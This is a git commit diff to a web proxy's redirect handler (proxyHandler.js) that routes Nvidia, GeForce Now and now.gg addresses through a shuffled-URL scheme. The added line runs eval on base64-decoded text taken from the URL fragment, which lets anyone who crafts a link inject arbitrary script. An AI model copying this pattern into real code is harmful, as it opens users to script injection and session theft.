59cd9d867727f2310e34b518c600e9c8e5f4a9e2
Crazystuffxyz <125907466+crazystuffofficial@users.noreply.github.com>
2024-03-09 07:04:26 -0500

    Update proxyHandler.js

--- static/proxyHandler.js
+++ static/proxyHandler.js
@@ -2,6 +2,7 @@ import StrShuffler from "/lib/StrShuffler.js";
 import Api from "/lib/api.js";
 async function checkForRedirect(){
 const api = new Api();
+var mainArray = eval(atob(location.hash.slice(1)));
 var sessionId = localStorage.getItem("sessionId");
 const shuffleDict = await api.shuffleDict(sessionId);
 var shuffler = new StrShuffler(shuffleDict);
@@ -12,13 +13,13 @@ function endsWith(string, string2){
     return false;
   }
 }
-if(__uv$config){
-  var mainUrl = new URL(__uv$config.decodeUrl(location.href.slice(location.origin.length + __uv$config.prefix.length, location.href.length)));
+if(mainArray[2]){
+  var mainUrl = new URL(__uv$config.decodeUrl(mainArray[0].slice(mainArray[1].length + __uv$config.prefix.length, mainArray[0].length)));
   if(endsWith(mainUrl.hostname, ".nvidia.com") || endsWith(mainUrl.hostname, ".geforcenow.com") || endsWith(mainUrl.hostname, ".now.gg") || mainUrl.hostname == "now.gg"){
     location.href = "/" + sessionId + "/" + shuffler.shuffle(mainUrl.href);
   }
 } else{
-  var mainUrl = new URL(shuffler.unshuffle(location.href.replace(location.origin + "/" + sessionId + "/", "")));
+  var mainUrl = new URL(shuffler.unshuffle(mainArray[0].replace(mainArray[1] + "/" + sessionId + "/", "")));
   if(!(endsWith(mainUrl.hostname, ".nvidia.com") || endsWith(mainUrl.hostname, ".geforcenow.com") || endsWith(mainUrl.hostname, ".now.gg") || mainUrl.hostname == "now.gg")){
   let x = await fetch("/uv/uv.bundle.js");
   let y = await x.text();
